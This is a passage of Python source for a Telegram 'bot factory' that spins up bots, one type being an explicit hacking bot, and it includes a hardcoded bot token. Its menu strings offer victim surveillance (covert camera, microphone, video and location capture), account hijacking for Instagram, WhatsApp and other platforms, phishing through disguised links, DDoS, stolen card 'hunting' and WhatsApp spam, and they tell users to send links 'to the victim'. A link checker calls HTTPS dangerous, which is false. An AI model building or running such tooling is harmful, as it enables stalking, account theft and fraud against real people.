import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, LabeledPrice
import requests
import threading
import os
import datetime
import re
import json
import random
import time
import string
import urllib.parse

# ==============================================================================
# ⬇️⬇️⬇️ **-- إعدادات المصنع الأساسية (تعديل إلزامي) --** ⬇️⬇️⬇️
# ==============================================================================
FACTORY_TOKEN = "8657941033:AAGuUfV4zl-zsxJfqeigATCdH9eCBevUOaI"
FACTORY_ADMIN_ID = 8139803164
FACTORY_SUB_CHANNEL = "T_5J5" # <-- قناة الاشتراك الإجباري للمصنع
# ==============================================================================

# --- إعدادات ملفات المصنع ---
BOTS_DATA_DIR = "bots_data"
PAID_BOTS_DIR = "paid_bots_factory"
BOTS_REGISTRY_FILE = "bots_registry.json"
PREMIUM_FEATURES_DIR = "premium_features_bots"

factory_bot = telebot.TeleBot(FACTORY_TOKEN, parse_mode="HTML")

# --- متغيرات عامة ---
running_bot_threads = {} 

# --- إنشاء المجلدات والملفات الأساسية ---
if not os.path.exists(BOTS_DATA_DIR): os.makedirs(BOTS_DATA_DIR)
if not os.path.exists(PAID_BOTS_DIR): os.makedirs(PAID_BOTS_DIR)
if not os.path.exists(PREMIUM_FEATURES_DIR): os.makedirs(PREMIUM_FEATURES_DIR)

if not os.path.exists(BOTS_REGISTRY_FILE):
    with open(BOTS_REGISTRY_FILE, 'w') as f: json.dump({}, f)

# --- دوال مساعدة لإدارة المصنع ---
def get_all_bots():
    try:
        with open(BOTS_REGISTRY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def register_bot(token, owner_id, bot_type):
    bots = get_all_bots()
    bots[token] = {'owner_id': owner_id, 'type': bot_type}
    with open(BOTS_REGISTRY_FILE, 'w') as f:
        json.dump(bots, f, indent=4)

def unregister_bot(token):
    bots = get_all_bots()
    if token in bots:
        del bots[token]
        with open(BOTS_REGISTRY_FILE, 'w') as f:
            json.dump(bots, f, indent=4)
        if token in running_bot_threads:
            del running_bot_threads[token]
            print(f"Thread for bot {token} removed from running list.")
        return True
    return False

def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

def is_factory_user_subscribed(user_id):
    if not FACTORY_SUB_CHANNEL:
        return True
    try:
        member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Factory sub check error: {e}")
        return False

# --- معالجات رسائل المصنع ---
@factory_bot.message_handler(commands=['start'])
def start(message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("➕ صنع بوت جديد", callback_data="create_new_bot"))
    kb.add(InlineKeyboardButton("🤖 بوتاتك", callback_data="my_bots"))
    factory_bot.send_message(message.chat.id, """<b>حياك الله في بوت صانع البوتات</b>

المطور: @llUUU9
قناة المطور: @Q99DP""", reply_markup=kb)

def back_to_main_menu(call):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("➕ صنع بوت جديد", callback_data="create_new_bot"))
    kb.add(InlineKeyboardButton("🤖 بوتاتك", callback_data="my_bots"))
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="""<b>حياك الله في بوت صانع البوتات</b>

المطور: @llUUU9
قناة المطور: @Q99DP""",
            reply_markup=kb
        )
    except:
        factory_bot.send_message(
            call.message.chat.id,
            """<b>حياك الله في بوت صانع البوتات</b>

المطور: @llUUU9
قناة المطور: @Q99DP""",
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data == "create_new_bot")
def choose_bot_type(call):
    if not is_factory_user_subscribed(call.from_user.id):
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"))
        kb.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="create_new_bot"))
        factory_bot.answer_callback_query(call.id)
        factory_bot.edit_message_text("🚫 <b>يجب عليك الاشتراك في قناة المطور أولاً لتتمكن من صنع بوت:</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)
        return

    factory_bot.answer_callback_query(call.id)
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🤖 بوت اندكسات", callback_data="ask_token_index"))
    kb.add(InlineKeyboardButton("🛡️ بوت اختراق", callback_data="ask_token_security"))
    kb.add(InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"))
    factory_bot.edit_message_text("اختر نوع البوت الذي تريد إنشاءه:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("ask_token_"))
def ask_token(call):
    bot_type = call.data.replace("ask_token_", "")
    factory_bot.answer_callback_query(call.id)
    factory_bot.edit_message_text("📝 <b>أرسل الآن توكن البوت الذي أنشأته من BotFather.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id)
    factory_bot.register_next_step_handler(call.message, lambda msg: handle_token(msg, call.from_user.id, bot_type))

def handle_token(message, admin_id, bot_type):
    user_token = message.text.strip()
    try:
        info = requests.get(f"https://api.telegram.org/bot{user_token}/getMe").json()
        if not info["ok"]:
            factory_bot.send_message(message.chat.id, "❌ <b>التوكن غير صالح.</b>")
            return
        
        if user_token in get_all_bots():
            factory_bot.send_message(message.chat.id, "❌ <b>هذا البوت تم إنشاؤه بالفعل.</b>")
            return

        factory_bot.send_message(message.chat.id, "⏳ جاري إعداد البوت، يرجى الانتظار...")
        
        bot_data_dir = os.path.join(BOTS_DATA_DIR, user_token.replace(":", "_"))
        if not os.path.exists(bot_data_dir):
            os.makedirs(bot_data_dir)

        register_bot(user_token, admin_id, bot_type)

        thread = None
        if bot_type == "index":
            thread = threading.Thread(target=run_new_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
        elif bot_type == "security":
            thread = threading.Thread(target=run_security_bot, args=(user_token, admin_id), daemon=True)
        
        if thread:
            thread.start()
            running_bot_threads[user_token] = thread

        bot_name = info['result']['first_name']
        bot_username = info['result']['username']
        
        factory_bot.send_message(message.chat.id, f"✅ <b>تم تشغيل البوت @{bot_username} بنجاح.</b>")
    except Exception as e:
        print(f"Error in handle_token: {e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ غير متوقع.")

# --- دالة بوت الاختراق الجديدة ---
def run_security_bot(token, owner_id):
    bot = telebot.TeleBot(token, parse_mode="HTML")

    def is_bot_paid_to_factory_sec():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False

    @bot.message_handler(commands=['start'])
    def security_start(message):
        welcome_text = "<b>مرحباً بك في بوت الاختراق.</b>"
        
        if not is_bot_paid_to_factory_sec():
            factory_link = '\n<a href="http://t.me/llUUU9">لصنع بوت اختراق اضغط هنا</a>'
            welcome_text += factory_link

        kb = InlineKeyboardMarkup()
        # أضف هنا أي أزرار أخرى تريدها لبوت الاختراق
        kb.add(InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={owner_id}"))
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=kb, disable_web_page_preview=True)

    try:
        bot_username = bot.get_me().username
        print(f"✅ Security bot @{bot_username} is running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Security bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
@factory_bot.callback_query_handler(func=lambda call: call.data == "my_bots")
def show_my_bots(call):
    user_id = call.from_user.id
    all_bots = get_all_bots()
    
    user_bots = {token: data for token, data in all_bots.items() if data.get('owner_id') == user_id}

    if not user_bots:
        factory_bot.answer_callback_query(call.id, "ليس لديك أي بوتات مصنوعة.", show_alert=True)
        return

    kb = InlineKeyboardMarkup(row_width=1)
    for token in user_bots.keys():
        try:
            bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
            if bot_info.get("ok"):
                bot_username = bot_info["result"]["username"]
                kb.add(InlineKeyboardButton(f"🤖 @{bot_username}", callback_data=f"manage_bot_{token}"))
            else:
                kb.add(InlineKeyboardButton(f"⚠️ بوت غير صالح (توكن محذوف)", callback_data=f"manage_bot_{token}"))
        except Exception as e:
            print(f"Error fetching bot info for token {token}: {e}")
            kb.add(InlineKeyboardButton(f"⚠️ خطأ في جلب معلومات البوت", callback_data=f"manage_bot_{token}"))

    kb.add(InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"))
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="اختر البوت الذي تريد إدارته من قائمتك:",
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in show_my_bots: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def handle_back_to_main(call):
    back_to_main_menu(call)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("manage_bot_"))
def show_bot_management_panel(call):
    token = call.data.replace("manage_bot_", "")
    
    try:
        bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if not bot_info.get("ok"):
            factory_bot.answer_callback_query(call.id, "لا يمكن الوصول إلى هذا البوت، قد يكون التوكن غير صالح أو تم حذفه.", show_alert=True)
            show_my_bots(call)
            return
        bot_username = bot_info["result"]["username"]
    except Exception as e:
        print(f"Error in show_bot_management_panel for token {token}: {e}")
        factory_bot.answer_callback_query(call.id, "حدث خطأ أثناء جلب معلومات البوت.", show_alert=True)
        return

    bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
    users_file = os.path.join(bot_data_dir, "users.txt")
    user_count = 0
    if os.path.exists(users_file):
        try:
            with open(users_file, 'r') as f:
                user_count = len(f.readlines())
        except Exception as e:
            print(f"Could not read users file for {token}: {e}")

    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(f"👥 المستخدمون ({user_count})", callback_data=f"bot_users_{token}"))
    kb.add(InlineKeyboardButton("❌ حذف البوت", callback_data=f"confirm_delete_{token}"))
    kb.add(InlineKeyboardButton("🔙 العودة إلى قائمة بوتاتك", callback_data="my_bots"))

    panel_text = f"<b>لوحة التحكم الخاصة بالبوت 🤖 @{bot_username}</b>\n\nاختر الإجراء الذي تريده:"
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=panel_text,
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in show_bot_management_panel: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("bot_users_"))
def show_bot_users(call):
    factory_bot.answer_callback_query(call.id, "هذه الميزة (عرض تفاصيل المستخدمين) قيد التطوير.", show_alert=True)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_bot(call):
    token = call.data.replace("confirm_delete_", "")
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("✅ نعم، احذف", callback_data=f"delete_bot_{token}"),
        InlineKeyboardButton("❌ لا، تراجع", callback_data=f"manage_bot_{token}")
    )

    warning_text = "<b>⚠️ هل أنت متأكد من أنك تريد حذف هذا البوت؟</b>\n\nسيتم إيقاف تشغيله وحذفه نهائياً من سجلات المصنع. هذا الإجراء لا يمكن التراجع عنه."
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=warning_text,
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in confirm_delete_bot: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("delete_bot_"))
def delete_bot_permanently(call):
    token = call.data.replace("delete_bot_", "")
    
    if unregister_bot(token):
        factory_bot.answer_callback_query(call.id, "✅ تم حذف البوت بنجاح.", show_alert=True)
        show_my_bots(call)
    else:
        factory_bot.answer_callback_query(call.id, "❌ خطأ: لم يتم العثور على البوت. ربما تم حذفه بالفعل.", show_alert=True)
        show_my_bots(call)

# ==============================================================================
# --- بداية منطق البوت المصنوع (الاندكسات) ---
# ==============================================================================
def run_new_bot(token, owner_id, data_dir):
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- إعدادات ملفات البوت المصنوع ---
    subscribers_file = os.path.join(data_dir, "users.txt")
    admins_file = os.path.join(data_dir, "admins.txt")
    channels_file = os.path.join(data_dir, "channels.txt")
    banned_file = os.path.join(data_dir, "banned.txt")
    status_file = os.path.join(data_dir, "status.txt")
    notify_file = os.path.join(data_dir, "notify.txt")
    state_file = os.path.join(data_dir, "state.json")
    paid_mode_file = os.path.join(data_dir, "paid_mode.txt")
    paid_users_file = os.path.join(data_dir, "paid_users.txt")
    start_message_file = os.path.join(data_dir, "start_message.txt")
    points_file = os.path.join(data_dir, "points.json")
    invited_by_file = os.path.join(data_dir, "invited_by.json")
    payment_methods_file = os.path.join(data_dir, "payment_methods.json")
    stars_config_file = os.path.join(data_dir, "stars_config.json")
    custom_buttons_file = os.path.join(data_dir, "custom_buttons.json")
    hidden_buttons_file = os.path.join(data_dir, "hidden_buttons.json")
    language_file = os.path.join(data_dir, "language.txt")

    # --- دوال مساعدة لإدارة الملفات ---
    def get_json_data(file_path):
        try:
            if not os.path.exists(file_path):
                with open(file_path, 'w', encoding='utf-8') as f: json.dump({}, f)
                return {}
            with open(file_path, 'r', encoding='utf-8') as f: return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError): return {}
        
    def save_json_data(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f: json.dump(data, f, indent=4, ensure_ascii=False)
        
    def get_lines(file_path):
        try:
            if not os.path.exists(file_path): return []
            with open(file_path, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError: return []
        
    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f: f.write(f"{line}\n")
            
    def remove_line(file_path, line_to_remove):
        lines = get_lines(file_path)
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if line != str(line_to_remove): f.write(f"{line}\n")
                
    def get_setting(file_path, default):
        try:
            with open(file_path, 'r', encoding='utf-8') as f: return f.read().strip()
        except FileNotFoundError: return default
        
    def set_setting(file_path, value):
        with open(file_path, 'w', encoding='utf-8') as f: f.write(str(value))
        
    def get_state(user_id):
        states = get_json_data(state_file)
        return states.get(str(user_id))
        
    def set_state(user_id, state):
        states = get_json_data(state_file)
        if state is None:
            if str(user_id) in states:
                del states[str(user_id)]
        else:
            states[str(user_id)] = state
        save_json_data(state_file, states)
        
    def has_premium_features():
        premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
        return os.path.exists(premium_file)

    # --- إعدادات أولية للبوت المصنوع ---
    if not os.path.exists(admins_file): add_line(admins_file, owner_id)
    if not os.path.exists(status_file): set_setting(status_file, "ON")
    if not os.path.exists(notify_file): set_setting(notify_file, "ON")
    if not os.path.exists(paid_mode_file): set_setting(paid_mode_file, "OFF")
    if not os.path.exists(stars_config_file): save_json_data(stars_config_file, {})
    if not os.path.exists(custom_buttons_file): save_json_data(custom_buttons_file, {})
    if not os.path.exists(hidden_buttons_file): save_json_data(hidden_buttons_file, [])
    if not os.path.exists(language_file): set_setting(language_file, "ar")

    # --- دوال التحقق من الحالة ---
    def is_admin(user_id): return str(user_id) in get_lines(admins_file)
    def is_paid_user(user_id): return str(user_id) in get_lines(paid_users_file)
    def is_paid_mode(): return get_setting(paid_mode_file, "OFF") == "ON"
    def is_bot_enabled(): return get_setting(status_file, "ON") == "ON"
    def is_user_banned(user_id): return str(user_id) in get_lines(banned_file)
    def is_bot_paid_to_factory():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False
    def is_user_subscribed(user_id):
        bot_specific_channels = get_lines(channels_file)
        if not bot_specific_channels: return True, []
        not_subscribed_bot_channels = []
        for ch in bot_specific_channels:
            try:
                member = bot.get_chat_member(f"@{ch}", user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    not_subscribed_bot_channels.append(ch)
            except Exception: not_subscribed_bot_channels.append(ch)
        if not_subscribed_bot_channels: return False, not_subscribed_bot_channels
        return True, []
    # --- نظام اللغات المتكامل (النسخة النهائية والمحدثة) ---
    def get_locale(lang_code=None):
        if lang_code is None:
            lang_code = get_setting(language_file, "ar")

        locales = {
            "ar": {
                # --- نصوص لوحة التحكم ---
                "welcome_panel": "<b>مرحباً بك! إليك لوحة التحكم الخاصة بك:</b>",
                "subscribers_count": "👥 المشتركين ({})",
                "broadcast_button": "📮 إذاعة رسالة",
                "forward_button": "🔄 توجيه رسالة",
                "add_channel_button": "💢 إضافة قناة",
                "delete_channel_button": "🔱 حذف قناة",
                "notify_on_button": "✔️ تفعيل التنبيه",
                "notify_off_button": "❎ تعطيل التنبيه",
                "bot_on_button": "✅ فتح البوت",
                "bot_off_button": "❌ إيقاف البوت",
                "ban_button": "🚫 حظر عضو",
                "unban_button": "🔓 إلغاء حظر",
                "add_admin_button": "➕ إضافة أدمن",
                "rem_admin_button": "➖ طرد أدمن",
                "paid_mode_button": "💰 الوضع المدفوع",
                "free_mode_button": "🆓 الوضع المجاني",
                "add_paid_button": "⭐ إضافة عضوية مدفوعة",
                "rem_paid_button": "🗑️ حذف عضوية مدفوعة",
                "set_stars_button": "🌟 تعيين عدد النجوم",
                "manage_payment_button": "💳 إدارة الدفع",
                "buttons_section_button": "🎛️ قسم الأزرار",
                "change_language_button": "🌍 تغيير اللغة",
                "edit_start_msg_button": "✏️ تعديل رسالة /start",
                "download_data_button": "📥 تحميل بيانات البوت",
                # --- نصوص المستخدم العام ---
                "welcome_user": "🤖✨ <b>مرحباً بك في بوت الخدمات.</b>",
                "must_subscribe": "🚫 <b>يجب عليك الاشتراك في القنوات التالية للمتابعة:</b>",
                "subscribed_button": "✅ تم الاشتراك",
                "contact_developer_button": "التواصل مع المطور 👨‍💻",
                "factory_link_text": "لصنع بوت اختراق اضغط هنا",
                "bot_under_maintenance": "🚨 <b>البوت متوقف حالياً للصيانة.</b>",
                "user_banned": "🚫 <b>أنت محظور من استخدام هذا البوت.</b>",
                # --- نصوص الأزرار الرئيسية ---
                "cam_back_btn": "اختراق الكاميرا الخلفية 📸", "cam_front_btn": "اختراق الكاميرا الأمامية 🔥",
                "mic_record_btn": "تسجيل صوت الضحية 🎤", "location_btn": "اختراق الموقع 📍",
                "record_video_btn": "تصوير الضحية فيديو 📹", "surveillance_cams_btn": "اختراق كاميرات المراقبة 📡",
                "insta_hack_btn": "اختراق انستجرام 🎁", "whatsapp_hack_btn": "اختراق واتساب 🟢",
                "pubg_hack_btn": "اختراق ببجي 🎮", "facebook_hack_btn": "اختراق فيسبوك 🌐",
                "tiktok_hack_btn": "اختراق تيك توك 🎵", "ff_hack_btn": "اختراق فري فاير 💎",
                "discord_hack_btn": "اختراق الديسكور🔥", "roblox_hack_btn": "اختراق روبلوكس🎮",
                "ask_wormgpt_btn": "الذكاء الاصطناعي 🤖", "snapchat_hack_btn": "اختراق سناب شات ⭐",
                "interpret_dream_btn": "تفسير الأحلام 🛌", "device_info_btn": "جمع معلومات الجهاز 📲",
                "akinator_fake_error_btn": "لعبة المارد الأزرق 🧞", "ddos_webapp_btn": "إغلاق المواقع 💣",
                "intelligence_game_btn": "لعبة الذكاء 🧠", "high_quality_shot_btn": "تصوير بدقة عالية 🖼️",
                "fake_gmail_btn": "إنشاء جميل وهمي🎫", "get_visa_btn": "صيد فيزات 💳",
                "fake_number_btn": "أرقام وهمية ☎️", "get_victim_number_btn": "معرفة رقم الضحية 📲",
                "check_link_btn": "فحص الروابط 🔭", "hack_wifi_btn": "اختراق الانترنت 🔋",
                "radio_menu_btn": "اختراق بث الراديو 📻", "zakhrafa_btn": "زخرفة الأسماء ✒️",
                "text_to_speech_btn": "تحويل النص إلى صوت 🔊", "hunt_usernames_btn": "صيد يوزرات تليجرام 🎣",
                "booming_link_start_btn": "تلغيم الروابط ☠️", "full_hack_info_btn": "اختراق الجهاز بالكامل 📵",
                "hide_link_btn": "إخفاء الرابط🔒", "whatsapp_spam_btn": "اسبام واتساب❄",
                # --- نصوص تفاعلية ---
                "back_button": "🔙 العودة",
                "cancel_button": "🔙 إلغاء",
                "action_cancelled": "✅ تم إلغاء الإجراء.",
                "language_changed": "✅ تم تغيير لغة البوت بنجاح.",
                "choose_language": "🌍 يرجى اختيار اللغة الجديدة للبوت:",
                "set_start_msg_prompt": "أرسل الآن رسالة الترحيب الجديدة.",
                "link_generated": "✅ تم توليد الرابط بنجاح",
                "copy_and_send_link": "<b>انسخ الرابط التالي وأرسله للضحية:</b>\n<code>{}</code>",
                "ask_wormgpt_prompt": "🤖 أرسل سؤالك الآن لـ WormGPT.",
                "interpret_dream_prompt": "🛌 أرسل حلمك الآن ليتم تفسيره.",
                "check_link_prompt": "🔭 أرسل الآن الرابط الذي تريد فحصه.",
                "text_to_speech_prompt": "أرسل الآن النص الذي تريد تحويله إلى بصمة صوتية.",
                "booming_link_prompt": "☠️ <b>قم بإرسال الرابط المراد تلغيمه</b>...",
                "hide_link_prompt": "🔒 الرجاء إدخال الرابط الأصلي الذي تريد إخفاءه:",
                "whatsapp_spam_prompt": "❄️ أرسل رقم واتساب الضحية مع رمز الدولة (مثال: 201001234567):",
                "action_success": "✅ تم تنفيذ الإجراء بنجاح.",
                "ask_channel_id": "أرسل معرف القناة بدون @",
                "ask_ban_id": "أرسل آي دي العضو الذي تريد حظره",
                "ask_unban_id": "أرسل آي دي العضو لإلغاء حظره",
                "ask_add_admin_id": "أرسل آي دي المستخدم للترقية",
                "ask_rem_admin_id": "أرسل آي دي الأدمن للعزل",
                "ask_add_paid_id": "أرسل آي دي العضو للإضافة للعضوية المدفوعة",
                "ask_rem_paid_id": "أرسل آي دي العضو للحذف من العضوية المدفوعة",
                "ask_broadcast_msg": "حسناً، أرسل رسالتك ليتم بثها لجميع المشتركين 📮",
                "ask_forward_msg": "حسناً، قم بتوجيه الرسالة لي الآن 🔄",
                "original_link_saved": "✅ تم حفظ الرابط الأصلي.\n\nأدخل الآن النطاق المخصص (مثال: instagram.com):",
                "invalid_original_link": "❌ الرابط الأصلي غير صالح. يجب أن يبدأ بـ http:// أو https://",
                "domain_saved": "✅ تم حفظ النطاق.\n\nأدخل الآن الكلمات الرئيسية (مثال: -login-now):",
                "invalid_domain": "❌ صيغة النطاق المخصص غير صحيحة. أرسل نطاقاً صالحاً (مثل: example.com).",
                "disguised_links_header": "<b>[~] الروابط المقنعة:</b>\n",
                "original_link_display": "<b>الرابط الأصلي:</b> {}\n\n",
                "invalid_phone_number": "❌ رقم الهاتف غير صالح. يرجى إرسال رقم صحيح مع رمز الدولة.",
                "sending_spam": "⏳ جاري إرسال رسالة الاسبام...",
                "spam_sent_success": "✅ تم إرسال رسالة الاسبام بنجاح!",
                "link_secure": "✅ <b>آمن.</b>\nيبدو أن هذا الرابط يستخدم بروتوكول HTTP القياسي.",
                "link_insecure": "🚨 <b>خطر!</b>\nتم اكتشاف أن هذا الرابط قد يكون ضاراً لأنه يستخدم بروتوكول HTTPS المشفر.",
                "link_unknown": "⚠️ لا يمكن تحديد حالة الرابط. يرجى إرسال رابط يبدأ بـ http أو https.",
                "tts_processing": "⏳ جاري تحويل النص إلى بصمة صوتية...",
                "tts_error": "❌ حدث خطأ أثناء التحويل. يرجى المحاولة مرة أخرى لاحقاً.",
                "service_busy": "❌ عذرًا، الخدمة مشغولة حاليًا. يرجى المحاولة مرة أخرى لاحقاً.",
                "zakhrafa_done": "<b>تمت الزخرفة:</b>\n\n{}",
                "choose_zakhrafa_lang": "اختر لغة النص للزخرفة:",
                "ask_zakhrafa_text": "أرسل الآن النص بـ<b>{}</b> ليتم زخرفته.",
                "lang_ar": "العربية",
                "lang_en": "الإنجليزية",
                # --- نصوص ميزة تحميل البيانات (جديد) ---
                "download_data_header": "📥 اختر البيانات التي تريد تحميلها:",
                "download_users_button": "👥 المستخدمين",
                "download_admins_button": "👑 المشرفين",
                "download_banned_button": "🚫 المحظورين",
                "download_channels_button": "📢 قنوات الاشتراك",
                "download_paid_users_button": "⭐ المستخدمين المدفوعين",
                "file_not_found": "⚠️ لم يتم العثور على الملف أو أنه فارغ.",
            },
            "en": {
                # --- Admin Panel Texts ---
                "welcome_panel": "<b>Welcome! Here is your control panel:</b>",
                "subscribers_count": "👥 Subscribers ({})",
                "broadcast_button": "📮 Broadcast Message",
                "forward_button": "🔄 Forward Message",
                "add_channel_button": "💢 Add Channel",
                "delete_channel_button": "🔱 Delete Channel",
                "notify_on_button": "✔️ Enable Notifications",
                "notify_off_button": "❎ Disable Notifications",
                "bot_on_button": "✅ Enable Bot",
                "bot_off_button": "❌ Disable Bot",
                "ban_button": "🚫 Ban User",
                "unban_button": "🔓 Unban User",
                "add_admin_button": "➕ Add Admin",
                "rem_admin_button": "➖ Remove Admin",
                "paid_mode_button": "💰 Paid Mode",
                "free_mode_button": "🆓 Free Mode",
                "add_paid_button": "⭐ Add Paid Member",
                "rem_paid_button": "🗑️ Remove Paid Member",
                "set_stars_button": "🌟 Set Stars Price",
                "manage_payment_button": "💳 Manage Payments",
                "buttons_section_button": "🎛️ Buttons Section",
                "change_language_button": "🌍 Change Language",
                "edit_start_msg_button": "✏️ Edit /start Message",
                "download_data_button": "📥 Download Bot Data",
                # --- General User Texts ---
                "welcome_user": "🤖✨ <b>Welcome to the services bot.</b>",
                "must_subscribe": "🚫 <b>You must subscribe to the following channels to continue:</b>",
                "subscribed_button": "✅ Subscribed",
                "contact_developer_button": "Contact Developer 👨‍💻",
                "factory_link_text": "To create a hacking bot, click here",
                "bot_under_maintenance": "🚨 <b>The bot is currently under maintenance.</b>",
                "user_banned": "🚫 <b>You are banned from using this bot.</b>",
                # --- Main Buttons Texts ---
                "cam_back_btn": "Hack Rear Camera 📸", "cam_front_btn": "Hack Front Camera 🔥",
                "mic_record_btn": "Record Victim's Audio 🎤", "location_btn": "Hack Location 📍",
                "record_video_btn": "Record Victim Video 📹", "surveillance_cams_btn": "Hack Surveillance Cams 📡",
                "insta_hack_btn": "Hack Instagram 🎁", "whatsapp_hack_btn": "Hack WhatsApp 🟢",
                "pubg_hack_btn": "Hack PUBG 🎮", "facebook_hack_btn": "Hack Facebook 🌐",
                "tiktok_hack_btn": "Hack TikTok 🎵", "ff_hack_btn": "Hack Free Fire 💎",
                "discord_hack_btn": "Hack Discord 🔥", "roblox_hack_btn": "Hack Roblox 🎮",
                "ask_wormgpt_btn": "Artificial Intelligence 🤖", "snapchat_hack_btn": "Hack Snapchat ⭐",
                "interpret_dream_btn": "Dream Interpretation 🛌", "device_info_btn": "Get Device Info 📲",
                "akinator_fake_error_btn": "Akinator Game 🧞", "ddos_webapp_btn": "Shutdown Websites 💣",
                "intelligence_game_btn": "Intelligence Game 🧠", "high_quality_shot_btn": "High-Quality Shot 🖼️",
                "fake_gmail_btn": "Create Fake Gmail 🎫", "get_visa_btn": "Get VISA Cards 💳",
                "fake_number_btn": "Fake Numbers ☎️", "get_victim_number_btn": "Get Victim's Number 📲",
                "check_link_btn": "Scan Links 🔭", "hack_wifi_btn": "Hack Wi-Fi 🔋",
                "radio_menu_btn": "Hack Radio Broadcast 📻", "zakhrafa_btn": "Decorate Names ✒️",
                "text_to_speech_btn": "Text to Speech 🔊", "hunt_usernames_btn": "Hunt Telegram Usernames 🎣",
                "booming_link_start_btn": "Weaponize Links ☠️", "full_hack_info_btn": "Full Device Hack 📵",
                "hide_link_btn": "Hide Link 🔒", "whatsapp_spam_btn": "WhatsApp Spam ❄️",
                # --- Interactive Texts ---
                "back_button": "🔙 Back",
                "cancel_button": "🔙 Cancel",
                "action_cancelled": "✅ Action has been cancelled.",
                "language_changed": "✅ Bot language has been changed successfully.",
                "choose_language": "🌍 Please choose the new language for the bot:",
                "set_start_msg_prompt": "Now, send the new welcome message.",
                "link_generated": "✅ Link generated successfully",
                "copy_and_send_link": "<b>Copy the following link and send it to the victim:</b>\n<code>{}</code>",
                "ask_wormgpt_prompt": "🤖 Send your question to WormGPT now.",
                "interpret_dream_prompt": "🛌 Send your dream now to be interpreted.",
                "check_link_prompt": "🔭 Send the link you want to scan now.",
                "text_to_speech_prompt": "Send the text you want to convert to a voice message now.",
                "booming_link_prompt": "☠️ <b>Send the link to be weaponized</b>...",
                "hide_link_prompt": "🔒 Please enter the original link you want to hide:",
                "whatsapp_spam_prompt": "❄️ Send the victim's WhatsApp number with country code (e.g., 15551234567):",
                "action_success": "✅ The action was executed successfully.",
                "ask_channel_id": "Send the channel ID without @",
                "ask_ban_id": "Send the ID of the user you want to ban",
                "ask_unban_id": "Send the ID of the user to unban",
                "ask_add_admin_id": "Send the user's ID to promote",
                "ask_rem_admin_id": "Send the admin's ID to demote",
                "ask_add_paid_id": "Send the user's ID to add to paid membership",
                "ask_rem_paid_id": "Send the user's ID to remove from paid membership",
                "ask_broadcast_msg": "Okay, send your message to be broadcast to all subscribers 📮",
                "ask_forward_msg": "Okay, forward the message to me now 🔄",
                "original_link_saved": "✅ Original link saved.\n\nEnter the custom domain (e.g., instagram.com):",
                "invalid_original_link": "❌ Invalid original link. It must start with http:// or https://",
